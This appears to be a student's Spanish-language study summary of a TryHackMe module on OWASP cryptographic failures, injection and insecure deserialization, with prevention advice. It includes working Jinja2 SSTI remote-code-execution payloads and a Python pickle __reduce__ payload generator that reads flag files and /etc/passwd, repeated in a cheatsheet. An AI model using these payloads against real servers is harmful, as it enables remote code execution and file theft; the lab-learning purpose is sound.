# 🛡️ TryHackMe — Cybersecurity 101

## Módulo: OWASP Insecure Data Handling | Study Summary

> **Keywords:** OWASP Top 10 · Cryptographic Failures · Injection · SSTI · Insecure Deserialization · Pickle · Jinja2

---

## 📚 Tabla de Contenidos

1. [OWASP Top 10 — Contexto](#1-owasp-top-10--contexto)
2. [A04: Cryptographic Failures](#2-a04-cryptographic-failures)
3. [A05: Injection](#3-a05-injection)
4. [A08: Software & Data Integrity Failures](#4-a08-software--data-integrity-failures)
5. [Quick Reference Cheatsheet](#5-quick-reference-cheatsheet)

---

## 1. OWASP Top 10 — Contexto

**OWASP (Open Web Application Security Project)** publica una lista actualizada de los riesgos más críticos en aplicaciones web. Este módulo cubre 3 de ellos enfocados en manejo inseguro de datos:

| ID | Vulnerabilidad | Causa raíz |
|----|---------------|------------|
| **A04** | Cryptographic Failures | Datos sensibles sin protección adecuada |
| **A05** | Injection | Input del usuario ejecutado como código |
| **A08** | Software & Data Integrity Failures | Confiar en código/datos sin verificar su origen |

> **In other words:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

---

## 2. A04: Cryptographic Failures

### ¿Qué es?

Ocurre cuando datos sensibles **no están adecuadamente protegidos** por falta de encriptación, implementación defectuosa, o uso de algoritmos débiles/obsoletos.

### Ejemplos comunes

| Falla | Ejemplo |
|-------|---------|
| Contraseñas sin hashing | Guardadas en texto plano en la DB |
| Algoritmos débiles | Uso de MD5, SHA1, o DES |
| Claves expuestas | Credenciales hardcodeadas en el código fuente o repos |
| Transmisión insegura | Datos enviados por HTTP en lugar de HTTPS |
| "Roll your own crypto" | Crear algoritmos propios en vez de usar estándares |

> ⚠️ **"Rolling your own cryptography"** — inventar tus propios algoritmos de cifrado es uno de los errores más peligrosos. Los algoritmos estándar han sido auditados por miles de expertos durante años.

### Prevención

- Usar funciones de hashing lentas y robustas para contraseñas: `bcrypt`, `scrypt`, `Argon2`
- Nunca guardar credenciales en source code, config files o repositorios
- Usar sistemas de gestión de secretos (ej: HashiCorp Vault, AWS Secrets Manager)
- Depender de librerías criptográficas de industria, no implementaciones propias

> **In other words:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

> **If it's missing:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

---

## 3. A05: Injection

### ¿Qué es?

Ocurre cuando una aplicación toma **input del usuario y lo pasa directamente** a un sistema que puede ejecutarlo (base de datos, shell, template engine, API) sin sanitizarlo.

### Tipos de Injection

| Tipo | Sistema afectado | Ejemplo |
|------|-----------------|---------|
| **SQL Injection** | Base de datos | `' OR 1=1 --` en un login form |
| **Command Injection** | Shell del OS | Input que llama a `os.system()` |
| **SSTI** | Template engine | `{{7*7}}` evaluado por Jinja2 |
| **Prompt Injection** | AI/LLM | Instrucciones maliciosas en prompts |

> ⚠️ Injection aparece **dos veces** en el OWASP Top 10 2025 — es considerada de alta severidad.

---

### SSTI — Server Side Template Injection

Un template engine como **Jinja2** (Python/Flask) renderiza variables dentro de plantillas HTML. Si acepta input del usuario sin sanitizar, ese input se **ejecuta como código**.

```
Input normal:    Hello, {{ name }}  →  Hello, Jose
Input malicioso: {{ 7*7 }}          →  49   ← el servidor ejecutó la operación
```

#### Payloads de reconocimiento

```python
# Verificar si el template engine evalúa expresiones
{{7*7}}               # Si devuelve 49 → vulnerable
{{config.items()}}    # Enumera configuración de la app (Flask)
```

#### Payload de explotación — RCE en Jinja2

```python
# Leer un archivo en el servidor
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}

# Listar archivos en el directorio actual
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}

# Buscar flag en todo el servidor
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name flag.txt').read() }}

# Ver quién ejecuta el proceso (permisos)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

> **Lab result:** `THM{SSTI_FLAG_OBTAINED}`

### Prevención de Injection

- Tratar **todo input del usuario como no confiable**
- Usar **prepared statements** y **parameterized queries** para SQL
- Evitar funciones que pasen input directo al shell del OS
- Validar, sanitizar y escapar caracteres peligrosos antes de procesar
- Usar APIs seguras que no invoquen el shell directamente

> **In other words:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

> **If it's missing:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

---

## 4. A08: Software & Data Integrity Failures

### ¿Qué es?

Ocurre cuando una aplicación **asume que código, actualizaciones o datos son legítimos sin verificar su autenticidad, integridad u origen**.

### Ejemplos comunes

| Escenario | Riesgo |
|-----------|--------|
| Actualizaciones de software sin checksum | Un atacante puede reemplazar el update con malware |
| Scripts cargados desde fuentes no confiables | CDNs comprometidos ejecutan código malicioso |
| Deserialización de datos sin validar | Objetos maliciosos ejecutan código al ser procesados |
| Pipelines CI/CD sin control de integridad | Artefactos modificados llegan a producción |

---

### Insecure Deserialization — Pickle (Python)

**Serialización** = convertir un objeto Python a bytes para guardarlo o enviarlo.
**Deserialización** = reconstruir el objeto desde esos bytes.

El problema: Python's `pickle` **ejecuta código arbitrario** al deserializar si el objeto contiene el método `__reduce__`.

#### Cómo funciona el ataque

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # __reduce__ define qué se ejecuta al deserializar
        return (eval, ("open('flag.txt').read()",))

# Serializar y encodear en base64
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)  # Pegar este output en la aplicación vulnerable
```

#### Variantes del payload según el objetivo

```python
# Leer flag.txt
return (eval, ("open('flag.txt').read()",))

# Buscar flag en todo el servidor
return (eval, ("__import__('os').popen('find / -name flag.txt').read()",))

# Ver permisos del proceso
return (eval, ("__import__('os').popen('whoami').read()",))

# Leer usuarios del sistema Linux
return (eval, ("open('/etc/passwd').read()",))
```

> ⚠️ **Nunca deserializar datos de fuentes no confiables.** Si la aplicación recibe un objeto serializado desde el cliente, ese objeto puede contener código malicioso.

### Prevención

- Verificar integridad de updates con checksums criptográficos
- Solo cargar scripts/configuraciones desde fuentes confiables y verificadas
- **Evitar `pickle` para datos provenientes del usuario** — usar formatos seguros como JSON
- Implementar controles de integridad en pipelines CI/CD
- Establecer trust boundaries claros: nunca asumir que datos externos son seguros

> **In other words:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

> **If it's missing:** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

---

## 5. Quick Reference Cheatsheet

### 🔐 Cryptographic Failures

```
❌ MD5, SHA1, DES          → obsoletos para seguridad
✅ bcrypt, scrypt, Argon2  → hashing de contraseñas
✅ AES-256, RSA            → encriptación de datos
⚠️  Nunca hardcodear credenciales en código o repos
⚠️  Nunca crear algoritmos propios ("roll your own crypto")
```

### 💉 Injection — SSTI Jinja2

```python
# Reconocimiento
{{7*7}}                  # → 49 = vulnerable
{{config.items()}}       # → enumera config Flask

# Explotación (RCE)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMANDO').read() }}

# Comandos útiles
'cat flag.txt'
'ls'
'whoami'
'find / -name flag.txt'
```

### 🧱 Insecure Deserialization — Pickle

```python
import pickle, base64

class Malicious:
    def __reduce__(self):
        return (eval, ("PAYLOAD_AQUI",))

encoded = base64.b64encode(pickle.dumps(Malicious())).decode()
print(encoded)  # → pegar en la app vulnerable

# Payloads comunes
"open('flag.txt').read()"
"__import__('os').popen('whoami').read()"
"open('/etc/passwd').read()"
"__import__('os').popen('find / -name flag.txt').read()"
```

### 🛡️ Reglas de Oro

| Regla | Aplica a |
|-------|----------|
| Todo input del usuario es **no confiable** | Injection |
| Nunca usar `pickle` con datos externos | Deserialization |
| Hashing lento para contraseñas | Crypto Failures |
| Verificar checksums en updates | Integrity Failures |
| Trust boundaries en CI/CD | Integrity Failures |

---

## 📝 Mis Notas & Preguntas

> *[ Escribe aquí tus dudas, insights y conexiones con otros conceptos ]*

---

*TryHackMe — Cybersecurity 101 | OWASP Insecure Data Handling*
